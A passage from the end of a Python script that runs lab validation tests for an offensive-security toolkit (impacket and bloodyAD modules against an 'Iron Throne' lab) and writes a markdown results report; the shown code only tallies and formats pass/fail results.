    for i, r in enumerate(tool_results, 1):
        status_icon = {
            "PASS": "PASS",
            "FAIL": "FAIL",
            "SKIP": "SKIP",
            "ERROR": "ERROR",
            "UNEXPECTED_PASS": "WARN",
        }.get(r["status"], r["status"])

        module_short = r["module"].split("/")[-1]
        desc = r["description"][:60] if r["description"] else ""
        md.append(f"| {i} | `{module_short}` | {desc} | **{status_icon}** | {r['duration']}s |")


# ===========================================================================
# Main
# ===========================================================================
if __name__ == "__main__":
    print("=" * 60, flush=True)
    print("  UwU Toolkit - Iron Throne Lab Validation", flush=True)
    print(f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", flush=True)
    print("=" * 60, flush=True)

    start_time = time.time()

    # Run tests
    test_impacket()
    test_bloodyad()

    total_time = round(time.time() - start_time, 1)

    # Summary
    section("RESULTS")
    total = passed + failed + skipped
    print(f"  Total:   {total}", flush=True)
    print(f"  Passed:  {passed}", flush=True)
    print(f"  Failed:  {failed}", flush=True)
    print(f"  Skipped: {skipped}", flush=True)
    print(f"  Time:    {total_time}s", flush=True)

    # Generate markdown
    md_content = generate_markdown()
    md_content += f"\n\n---\n*Total execution time: {total_time}s*\n"

    # Write report
    report_path = os.path.join(UWU_ROOT, "reports", "iron_throne_validation.md")
    os.makedirs(os.path.dirname(report_path), exist_ok=True)
    with open(report_path, "w") as f:
        f.write(md_content)

    print(f"\n  Report: {report_path}", flush=True)
    print("=" * 60, flush=True)
